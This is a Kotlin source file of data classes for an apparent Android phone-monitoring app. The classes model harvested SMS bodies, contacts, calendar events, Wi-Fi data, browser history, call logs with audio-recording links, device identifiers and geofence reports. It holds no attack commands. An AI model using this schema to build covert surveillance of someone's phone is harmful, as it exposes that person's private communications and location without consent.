package com.empresa.monitor.data.bean

import com.google.gson.annotations.SerializedName

// ─── SMS ──────────────────────────────────────────────
data class SmsBean(
    @SerializedName("sms_id") val smsId: Long,
    @SerializedName("address") val address: String,
    @SerializedName("contact_name") val contactName: String?,
    @SerializedName("body") val body: String,
    @SerializedName("type") val type: Int,
    @SerializedName("date") val date: Long,
    @SerializedName("date_sent") val dateSent: Long?,
    @SerializedName("is_mms") val isMms: Boolean = false,
    @SerializedName("mms_subject") val mmsSubject: String? = null,
    @SerializedName("read") val read: Boolean = true
)

// ─── Contact ──────────────────────────────────────────
data class ContactBean(
    @SerializedName("name") val name: String?,
    @SerializedName("phone") val phone: String,
    @SerializedName("phone_type") val phoneType: Int?,
    @SerializedName("email") val email: String?,
    @SerializedName("photo_base64") val photoBase64: String? = null,
    @SerializedName("times_contacted") val timesContacted: Int = 0,
    @SerializedName("last_time_contacted") val lastTimeContacted: Long?,
    @SerializedName("starred") val starred: Boolean = false
)

// ─── Calendar ─────────────────────────────────────────
data class CalendarBean(
    @SerializedName("event_id") val eventId: Long,
    @SerializedName("title") val title: String?,
    @SerializedName("description") val description: String?,
    @SerializedName("event_location") val eventLocation: String?,
    @SerializedName("start_time") val startTime: Long,
    @SerializedName("end_time") val endTime: Long,
    @SerializedName("all_day") val allDay: Boolean = false,
    @SerializedName("organizer") val organizer: String?,
    @SerializedName("calendar_name") val calendarName: String?
)

// ─── WiFi ─────────────────────────────────────────────
data class WifiBean(
    @SerializedName("ssid") val ssid: String,
    @SerializedName("bssid") val bssid: String?,
    @SerializedName("capabilities") val capabilities: String?,
    @SerializedName("frequency") val frequency: Int?,
    @SerializedName("rssi") val rssi: Int?,
    @SerializedName("is_connected") val isConnected: Boolean = false,
    @SerializedName("ip_address") val ipAddress: String?,
    @SerializedName("link_speed") val linkSpeed: Int?,
    @SerializedName("recorded_at") val recordedAt: Long
)

// ─── Browser History ──────────────────────────────────
data class BrowserBean(
    @SerializedName("url") val url: String,
    @SerializedName("title") val title: String?,
    @SerializedName("browser_package") val browserPackage: String?,
    @SerializedName("browser_name") val browserName: String?,
    @SerializedName("visit_count") val visitCount: Int?,
    @SerializedName("last_visited") val lastVisited: Long?,
    @SerializedName("bookmark") val bookmark: Boolean = false
)

// ─── Call Record ──────────────────────────────────────
data class CallRecordBean(
    @SerializedName("call_record_id") val callRecordId: String,
    @SerializedName("phone_number") val phoneNumber: String,
    @SerializedName("contact_name") val contactName: String?,
    @SerializedName("call_type") val callType: Int,
    @SerializedName("duration_seconds") val durationSeconds: Int = 0,
    @SerializedName("call_date") val callDate: Long,
    @SerializedName("has_audio_recording") val hasAudioRecording: Boolean = false,
    @SerializedName("audio_file_url") val audioFileUrl: String? = null
)

// ─── Device Info ──────────────────────────────────────
data class DeviceInfoBean(
    @SerializedName("device_model") val deviceModel: String,
    @SerializedName("device_brand") val deviceBrand: String,
    @SerializedName("android_version") val androidVersion: String,
    @SerializedName("sdk_version") val sdkVersion: Int,
    @SerializedName("manufacturer") val manufacturer: String? = null,
    @SerializedName("device_id") val deviceId: String? = null,
    @SerializedName("phone_number") val phoneNumber: String? = null,
    @SerializedName("network_operator") val networkOperator: String? = null,
    @SerializedName("wifi_mac") val wifiMac: String? = null,
    @SerializedName("battery_level") val batteryLevel: Int? = null,
    @SerializedName("storage_total") val storageTotal: Long? = null,
    @SerializedName("storage_available") val storageAvailable: Long? = null,
    @SerializedName("ram_total") val ramTotal: Long? = null,
    @SerializedName("ram_available") val ramAvailable: Long? = null
)

// ─── Geofence ─────────────────────────────────────────
data class GeofenceBean(
    @SerializedName("geofence_id") val geofenceId: String,
    @SerializedName("name") val name: String?,
    @SerializedName("latitude") val latitude: Double,
    @SerializedName("longitude") val longitude: Double,
    @SerializedName("radius_meters") val radiusMeters: Float,
    @SerializedName("transition_type") val transitionType: Int
)

data class GeofenceReportBean(
    @SerializedName("geofence_id") val geofenceId: String,
    @SerializedName("geofence_name") val geofenceName: String?,
    @SerializedName("transition_type") val transitionType: Int,
    @SerializedName("latitude") val latitude: Double?,
    @SerializedName("longitude") val longitude: Double?,
    @SerializedName("triggered_at") val triggeredAt: Long
)
